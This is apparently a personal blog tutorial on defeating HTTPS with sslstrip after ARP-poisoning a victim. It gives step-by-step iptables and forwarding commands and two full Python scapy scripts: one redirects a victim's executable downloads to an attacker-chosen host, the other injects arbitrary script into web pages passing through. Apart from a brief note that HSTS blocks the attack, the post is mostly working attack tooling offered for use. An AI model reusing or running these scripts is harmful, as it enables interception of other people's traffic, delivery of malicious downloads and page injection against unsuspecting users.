---
title: Bypassing HTTPS
date: 2021-08-07 09:45:47 +07:00
categories: python_101
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: A guide to Bypass HTTPS enabled sites.
---

<p align="left">
 <img src="https://www.meme-arsenal.com/memes/6916d6688be5030280132d59bce29143.jpg">
</p>

The simplest way to make all the programs work and intercept HTTPS communcations is by using a program called [sslstrip by moxie0](https://github.com/moxie0/sslstrip). Basically `sslstrip` listens on `port 10000` and strips any HTTPS coms and downgrades it to HTTP. We can use this to become the MITM as we used to by using our ArpSpoof Program and redirect any requests from the victim onto `sslstrip` and the onto the server. 
  Sslstrip communicates with the end endpoint server using HTTPS , recieves the response and downgrades HTTPS --> HTTP, then modifies the request as needed in the (Code Injector, File Interceptor Program) response and delivers it to the client in downgraded HTTP. 

  ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/Bypassing_HTTPS/https-1.png)

## Steps to perform sslstrip:

1. Run your ArpSpoof Program to ARP poison victim and become MITM.
2. Set your machine into forwarding mode:
   `sudo echo "1" > /proc/sys/net/ipv4/ip_forward`
2. Setup your `iptable queues` if any . (Most of my programs use queues to intercept and modify the traffic like burp)
   `iptables -I OUTPUT -j NFQUEUE --queue-num 0`
   `iptables -I INPUT -j NFQUEUE --queue-num 0`
3. Change your programs as follows:
  `Sport` and `dport` values = `sslstrip` port (`port 10000`).
  Check for redundant loops between sslstrip and your iptable queues.
  If response is sent in `HTTP/1.1` fields such as `Content-Length` will not be sent in a single response but as chunks. Change this to `HTTP/1.0` to recieve it as a whole single repsonse.
4. Run `sslstrip`:
   `python sslstrip.py`
5. Redirect all packets from the victim source traffic onto your made iptable queues (port 80) and finallu over to sslstrip (port 10000) using the following iptables command:
   `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000`

__Traffic Flow:__ _victim <--> Attacker iptable queues <--> sslstrip <..> target server._


## Fix: Enable HSTS

- The browser specifies a list of websites to only load through HTTPS, hence defeating this form of attack.
- It is prevalant on popular sites like google,facebook etc.


## Previous programs modified/rewritten to support HTTPS:

### 1. File Interceptor

_[Source](https://github.com/m3rcer/Python-Hax/blob/main/File_Interceptor/README.md)_
- We changed the `sport` and `dport` definitions to match sslstrip's port definitions (port 10000).
- If an 'exe' were replaced by an 'exe' it would cause a bug where a redundant loop between the iptable queues and sslstrip would be caused. To manage it we check if the replaced 'exe' url matches the requested 'exe' in the request, and only if it dosen't the download is replaced with the new 'exe'. 


```python
#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import subprocess
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--redirect-host", dest="host", help="Redirect HTTP EXE requests to this HTTPS Site/Host")
    parser.add_argument("-t", "--file-type", dest="type", help="File extension type to redirect")
    options = parser.parse_args()
    if not options.host:
        # code to handle error
        parser.error("\n[-] Please specify a valid HTTPS redirect Host,  use --help for info.")
    if not options.type:
        # code to handle error
        parser.error("\n[-] Please specify a valid file extension,  use --help for info.")
    return options

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    # remove fields and allow scapy to autocomplete these layers
    del packet[scapy.IP].len
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].chksum
    return packet



def process_packet(packet):
    # Cloning and converting to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    # Filter for HTTP layer
    if scapy_packet.haslayer(scapy.Raw):
    # using sslstrip
        if scapy_packet[scapy.TCP].dport == 10000:
            #print("[+] HTTP Request found")
            # Check for download exe's
            if options.type in scapy_packet[scapy.Raw].load:
                print("[+] An exe request has been found. Trying to Intercept.\n")
                ack_list.append(scapy_packet[scapy.TCP].ack)
            #print(scapy_packet.show())
        # using sslstrip
        elif scapy_packet[scapy.TCP].sport == 10000:
            #print("[+] HTTP Response found")
            # Checking for redundant exe
            if scapy_packet[scapy.TCP].seq in ack_list and options.host.split("//")[1] not in scapy_packet[scapy.Raw].load :
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file\n\n")
                # Remove any clutter added to packet using \n\n
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\r\nLocation: " + options.host + "\n\n")
                print("[+] Request succesfully redirected to target: " + options.host)
                # Convert scapy packet to str and payload
                packet.set_payload(str(modified_packet))

    packet.accept()

print("""
    _______ __        ____      __                            __            
   / ____(_) /__     /  _/___  / /____  _____________  ____  / /_____  _____
  / /_  / / / _ \    / // __ \/ __/ _ \/ ___/ ___/ _ \/ __ \/ __/ __ \/ ___/
 / __/ / / /  __/  _/ // / / / /_/  __/ /  / /__/  __/ /_/ / /_/ /_/ / /    
/_/   /_/_/\___/  /___/_/ /_/\__/\___/_/   \___/\___/ .___/\__/\____/_/     
                                                   /_/                      
    """)

try:
    options = get_arguments()
    print("[-] Note: To redirect a target remote system, ARP Poison the target's cache to allow all DNS requests to flow through this machine\n\n")
    print("\n\n******************************************************************************************")
    print("""
    [!] Run the following commands as root before using this program.
    
    1. iptables -I OUTPUT -j NFQUEUE --queue-num 0
    2. iptables -I INPUT -j NFQUEUE --queue-num 0
    3. echo 1 > /proc/sys/net/ipv4/ip_forward
    
    """)
    queue = netfilterqueue.NetfilterQueue()
    # Bind to created queue using iptables; process_packet-->callback()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ......\n[+] Exitting!")
```



### 2. Code Injector:

_[Source](https://github.com/m3rcer/Python-Hax/blob/main/CodeInjector/README.md)_
- We changed the `sport` and `dport` definitions to match sslstrip's port definitions (port 10000).
- We replaced the load for the request from "HTTP/1.1 to HTTP/1.0" to get the response as a whole and not chunked.

```python
#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import argparse
import re


# Parse Args
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file-to-inject", dest="file", help="File/Code to Inject", type=str)
    options = parser.parse_args()
    if not options.file:
        # code to handle error
        parser.error("\n[-] Please specify a valid file with code to inject(js,HTML,php...),  use --help for info.")
    File = open(options.file, 'r')
    f = File.readlines()
    code = ""
    for line in f:
        code += line.strip()
    return(code)

# Alter packets load
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #print(scapy_packet.show())
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            # using sslstrip
            if scapy_packet[scapy.TCP].dport == 10000:
                print("\n[+] Request from: " + scapy_packet[scapy.IP].src)
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                # Using HTTP/1.0
                load = load.replace("HTTP/1.1", "HTTP/1.0")
            # using sslstrip
            elif scapy_packet[scapy.TCP].sport == 10000:
                print("[+] Response from: " + scapy_packet[scapy.IP].src)
                injection_code = code
                # Appends injected code before terminating </body> tag
                load = load.replace("</body>", injection_code + "</body>")
                # Capture non capturing groups and use non capturing regex --> (?:...)
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
            # Exec if load is modified
            if load != scapy_packet[scapy.Raw].load:
                print("[!] Response Injected!")
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        # Irrelevant HTML data
        except UnicodeDecodeError:
            pass
    packet.accept()

print("""
                              (                                       
   (          (           )\ )                        )           
   )\         )\ )   (   (()/(       (     (       ( /(      (    
 (((_)   (   (()/(  ))\   /(_)) (    )\   ))\  (   )\()) (   )(   
 )\___   )\   ((_))/((_) (_))   )\ )((_) /((_) )\ (_))/  )\ (()\  
((/ __| ((_)  _| |(_))   |_ _| _(_/(  ! (_))  ((_)| |_  ((_) ((_) 
 | (__ / _ \/ _` |/ -_)   | | | ' \))| |/ -_)/ _| |  _|/ _ \| '_| 
  \___|\___/\__,_|\___|  |___||_||_|_/ |\___|\__|  \__|\___/|_|   
                                   |__/                           
""")

print("[-] Specify a file to inject code from to poison any HTTP websites source.\n\n")
print("[NOTE:] To sniff a target remote system, ARP Poison the target's cache to allow all DNS requests to flow through this machine\n\n")
print("""
[!] Run the following commands as root before using this program to setup IPTABLE rules.

1. iptables -I OUTPUT -j NFQUEUE --queue-num 0
2. iptables -I INPUT -j NFQUEUE --queue-num 0
3. echo 1 > /proc/sys/net/ipv4/ip_forward

""")

try:
    code = get_arguments()
    queue = netfilterqueue.NetfilterQueue()
    # Bind to created queue using iptables; process_packet-->callback()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ......\n\n\n Exiting Program!")
```

